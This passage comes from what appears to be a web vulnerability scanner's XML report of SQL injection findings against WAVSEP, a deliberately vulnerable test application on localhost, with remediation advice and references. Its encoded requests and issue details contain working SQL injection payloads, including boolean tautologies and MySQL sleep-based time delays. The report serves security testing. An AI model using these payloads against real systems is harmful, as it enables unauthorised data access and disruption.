      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBJZGVudGljYWwvQ2FzZTAyLUluamVjdGlvbkluVmlldy1TdHJpbmctQmxpbmQtMjAwVmFsaWRSZXNwb25zZVdpdGhEZWZhdWx0T25FeGNlcHRpb24uanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxNA0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwSWRlbnRpY2FsL0Nhc2UwMi1JbmplY3Rpb25JblZpZXctU3RyaW5nLUJsaW5kLTIwMFZhbGlkUmVzcG9uc2VXaXRoRGVmYXVsdE9uRXhjZXB0aW9uLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KdXNlcm5hbWU9dXNlcjE1NzAyMTAwNiclMjBvciUyMCc0NzcxJyUzZCc0Nzcx]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAwOjI3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3NDMNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMiAtIEluamVjdGlvbiBpbnRvIGEgc3RyaW5nIHZhbHVlIGluIGEgcHJpdmF0ZSByZXNvdXJjZSB2aWV3IHBhZ2Ugd2l0aCBkZWZhdWx0IHZhbGlkIHJlc3BvbnNlIG9uIGV4Y2VwdGlvbjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgoKVGhlIGxpc3Qgb2YgdXNlcnM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgpVc2VySWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpVc2VyTmFtZQo8L0I+CjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoxCjwvVEQ+CjxURD4KdXNlcjEKPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjIKPC9URD4KPFREPgpkYXZpZAo8L1REPgo8L1RSPgo8VFI+CjxURD4KMwo8L1REPgo8VEQ+CmFkbWluCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgo0CjwvVEQ+CjxURD4KdXNlcjQKPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjUKPC9URD4KPFREPgp1c2VyNQo8L1REPgo8L1RSPgo8VFI+CjxURD4KNgo8L1REPgo8VEQ+CnVzZXI2CjwvVEQ+CjwvVFI+CjxUUj4KPFREPgo3CjwvVEQ+CjxURD4KdXNlcjcKPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBJZGVudGljYWwvQ2FzZTAyLUluamVjdGlvbkluVmlldy1TdHJpbmctQmxpbmQtMjAwVmFsaWRSZXNwb25zZVdpdGhEZWZhdWx0T25FeGNlcHRpb24uanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxNA0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwSWRlbnRpY2FsL0Nhc2UwMi1JbmplY3Rpb25JblZpZXctU3RyaW5nLUJsaW5kLTIwMFZhbGlkUmVzcG9uc2VXaXRoRGVmYXVsdE9uRXhjZXB0aW9uLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KdXNlcm5hbWU9dXNlcjEyODcwOTU1MCclMjBvciUyMCc2NzQ5JyUzZCc2NzUz]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAwOjI3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NTYNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMiAtIEluamVjdGlvbiBpbnRvIGEgc3RyaW5nIHZhbHVlIGluIGEgcHJpdmF0ZSByZXNvdXJjZSB2aWV3IHBhZ2Ugd2l0aCBkZWZhdWx0IHZhbGlkIHJlc3BvbnNlIG9uIGV4Y2VwdGlvbjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgoKVGhlIGxpc3Qgb2YgdXNlcnM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgpVc2VySWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpVc2VyTmFtZQo8L0I+CjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBJZGVudGljYWwvQ2FzZTAyLUluamVjdGlvbkluVmlldy1TdHJpbmctQmxpbmQtMjAwVmFsaWRSZXNwb25zZVdpdGhEZWZhdWx0T25FeGNlcHRpb24uanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxNA0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwSWRlbnRpY2FsL0Nhc2UwMi1JbmplY3Rpb25JblZpZXctU3RyaW5nLUJsaW5kLTIwMFZhbGlkUmVzcG9uc2VXaXRoRGVmYXVsdE9uRXhjZXB0aW9uLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KdXNlcm5hbWU9dXNlcjEnJTJiKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpJTJiJw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU5OjI3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3NDMNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMiAtIEluamVjdGlvbiBpbnRvIGEgc3RyaW5nIHZhbHVlIGluIGEgcHJpdmF0ZSByZXNvdXJjZSB2aWV3IHBhZ2Ugd2l0aCBkZWZhdWx0IHZhbGlkIHJlc3BvbnNlIG9uIGV4Y2VwdGlvbjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgoKVGhlIGxpc3Qgb2YgdXNlcnM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgpVc2VySWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpVc2VyTmFtZQo8L0I+CjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoxCjwvVEQ+CjxURD4KdXNlcjEKPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjIKPC9URD4KPFREPgpkYXZpZAo8L1REPgo8L1RSPgo8VFI+CjxURD4KMwo8L1REPgo8VEQ+CmFkbWluCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgo0CjwvVEQ+CjxURD4KdXNlcjQKPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjUKPC9URD4KPFREPgp1c2VyNQo8L1REPgo8L1RSPgo8VFI+CjxURD4KNgo8L1REPgo8VEQ+CnVzZXI2CjwvVEQ+CjwvVFI+CjxUUj4KPFREPgo3CjwvVEQ+CjxURD4KdXNlcjcKPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1726059029543582720</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case04-InjectionInUpdate-Numeric-TimeDelayExploit-200Identical.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case04-InjectionInUpdate-Numeric-TimeDelayExploit-200Identical.jsp [transactionId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionId</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the transactionId parameter. The application timed out when responding to the request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBJZGVudGljYWwvQ2FzZTA0LUluamVjdGlvbkluVXBkYXRlLU51bWVyaWMtVGltZURlbGF5RXhwbG9pdC0yMDBJZGVudGljYWwuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxNw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwSWRlbnRpY2FsL0Nhc2UwNC1JbmplY3Rpb25JblVwZGF0ZS1OdW1lcmljLVRpbWVEZWxheUV4cGxvaXQtMjAwSWRlbnRpY2FsLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KdHJhbnNhY3Rpb25JZD0oc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSk=]]></request>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8796667660111499264</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case05-InjectionInUpdate-String-TimeDelayExploit-200Identical.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case05-InjectionInUpdate-String-TimeDelayExploit-200Identical.jsp [description parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>description</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the description parameter. The application took <b>20010</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBJZGVudGljYWwvQ2FzZTA1LUluamVjdGlvbkluVXBkYXRlLVN0cmluZy1UaW1lRGVsYXlFeHBsb2l0LTIwMElkZW50aWNhbC5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDE3DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBJZGVudGljYWwvQ2FzZTA1LUluamVjdGlvbkluVXBkYXRlLVN0cmluZy1UaW1lRGVsYXlFeHBsb2l0LTIwMElkZW50aWNhbC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCmRlc2NyaXB0aW9uPWVtcHR5JyUyMGFuZCUyMChzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKS0tJTIw]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAxOjAxIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMjQNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNSAtIEluamVjdGlvbiBpbnRvIGEgc3RyaW5nIHZhbHVlIGluIGFuIHVwZGF0ZSBwYWdlIHdpdGggaWRlbnRpY2FsIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgowCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6046889705630720</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case06-InjectionInUpdate-Date-TimeDelayExploit-200Identical.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case06-InjectionInUpdate-Date-TimeDelayExploit-200Identical.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the 